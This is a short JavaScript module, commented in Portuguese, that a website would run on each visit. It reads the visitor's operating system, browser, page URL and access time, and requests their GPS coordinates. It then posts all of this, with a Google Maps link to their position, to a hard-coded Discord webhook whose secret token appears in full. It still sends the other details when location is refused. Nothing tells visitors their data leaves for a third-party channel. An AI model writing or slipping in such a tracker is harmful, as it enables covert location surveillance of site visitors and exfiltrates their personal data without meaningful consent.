// Função para enviar informações ao Discord
const getOSAndSendToDiscord = () => {
	if (typeof window === "undefined") return;

	const userAgent = window.navigator.userAgent;
	const os = window.navigator.platform;

	const browser = (() => {
		if (/Edg\//.test(userAgent)) return "Edge";
		if (/OPR\//.test(userAgent) || /Opera/.test(userAgent)) return "Opera";
		if (/Chrome/.test(userAgent) && !/Edg\//.test(userAgent) && !/OPR\//.test(userAgent)) return "Chrome";
		if (/Safari/.test(userAgent) && !/Chrome/.test(userAgent)) return "Safari";
		if (/Firefox/.test(userAgent)) return "Firefox";
		return "Desconhecido";
	})();

	const getOS = () => {
		if (/Win/.test(os)) return "Windows";
		if (/Mac/.test(os)) return "MacOS";
		if (/Linux/.test(os)) return "Linux";
		if (/Android/.test(userAgent)) return "Android";
		if (/iPhone|iPad|iPod/.test(userAgent)) return "iOS";
		return "Desconhecido";
	};

	const operatingSystem = getOS();
	const accessTime = new Date().toLocaleString("pt-BR", {
		timeZone: "America/Sao_Paulo",
	});

	if (navigator.geolocation) {
		navigator.geolocation.getCurrentPosition(
			(position) => {
				const { latitude, longitude } = position.coords;

				fetch("https://discord.com/api/webhooks/1402678367311888395/6qjMvUGV41-IudhWLzn1OXjtx1Q7SugLz_B0SyIGkLj8LVao4Wt0n4YE1irNq5jXzxrU", {
					method: "POST",
					headers: { "Content-Type": "application/json" },
					body: JSON.stringify({
						content: `**Novo Acesso:** OS: ${operatingSystem} / Navegador: ${browser} / Acesso: ${accessTime} / Localização: Lat: ${latitude}, Long: ${longitude}\n\nPage: ${window.location.href}\n\nGoogle Maps:https://maps.google.com/?q=${latitude},${longitude}`,
					}),
				});
			},
			() => {
				fetch("https://discord.com/api/webhooks/1402678367311888395/6qjMvUGV41-IudhWLzn1OXjtx1Q7SugLz_B0SyIGkLj8LVao4Wt0n4YE1irNq5jXzxrU", {
					method: "POST",
					headers: { "Content-Type": "application/json" },
					body: JSON.stringify({
						content: `**Novo Acesso:** OS: ${operatingSystem} / Navegador: ${browser} / Acesso: ${accessTime} / Localização: Não permitida pelo usuário\n\nPage: ${window.location.href}`,
					}),
				});
			},
		);
	}
};

export default getOSAndSendToDiscord;
